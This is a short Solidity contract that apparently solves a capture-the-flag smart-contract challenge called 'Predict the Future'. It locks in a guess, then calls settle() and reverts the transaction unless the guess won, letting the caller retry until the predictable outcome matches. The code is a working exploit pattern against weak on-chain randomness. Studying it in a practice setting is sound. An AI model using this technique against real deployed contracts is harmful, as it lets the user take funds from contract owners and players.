// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.4.21;

contract Predictor {
    PredictTheFutureChallenge challenge;

    function Predictor(address challenge_address) public {
        challenge = PredictTheFutureChallenge(challenge_address);
    }

    function challengeLockInGuess(uint8 n) public payable {
        require(msg.value == 1 wei);
        challenge.lockInGuess.value(msg.value)(n);
    }

    function challengeSettle() public {
        challenge.settle();
        require(challenge.isComplete() == true);
    }

    function() public payable { }
}